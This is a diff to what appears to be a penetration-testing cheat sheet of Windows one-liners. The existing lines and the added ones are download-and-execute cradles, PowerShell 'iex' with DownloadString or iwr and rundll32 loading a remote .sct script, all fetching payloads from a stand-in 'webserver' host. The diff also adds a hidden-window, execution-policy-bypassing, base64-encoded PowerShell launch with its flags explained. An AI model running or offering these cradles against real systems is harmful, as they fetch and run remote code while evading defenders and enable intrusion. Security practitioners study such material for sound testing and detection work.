@@ -93,6 +93,8 @@ Download and run a script
 
     powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
 
+    powershell.exe -exec bypass "iex (New-Object Net.Webclient).DownloadString('http://webserver/payload.ps1')"
+
 * JavaScript through Rundll32 (used by Win32/Poweliks malware)::
 
     rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
@@ -116,6 +118,21 @@ Downloading files with PowerShell::
 Run a PowerShell script::
 
     %windir%\System32\WindowsPowerShell\v1.0\powershell.exe -Noninteractive -ExecutionPolicy Bypass –Noprofile -file MyScript.ps1
+
+Run PowerShell code endoded as UTF-16LE+Base64:
+
+.. code-block:: sh
+
+    # start /B : start application without creating a new window
+    # -nop for -NoProfile : do not load the PowerShell profile
+    # -sta for -Sta : start using a single-threaded apartment
+    # -noni for -NonInteractive : does not present an interactive prompt
+    # -w 1 or -w hidden or -win Hidden for -WindowStyle Hidden : hiden PowerShell window
+    # -enc for -EncodedCommand : execute the command encoded in base64
+    # -ep bypass or -exec bypass for -ExecutionPolicy bypass : set the default execution
+    #       policy for the current session and saves it in $env:PSExecutionPolicyPreference
+    #       (redundant when -enc is given)
+    start /b powershell -nop -sta -w 1 -enc "$(iconv -t utf16le < payload.ps1 | base64)"
 
 
 Proxy settings
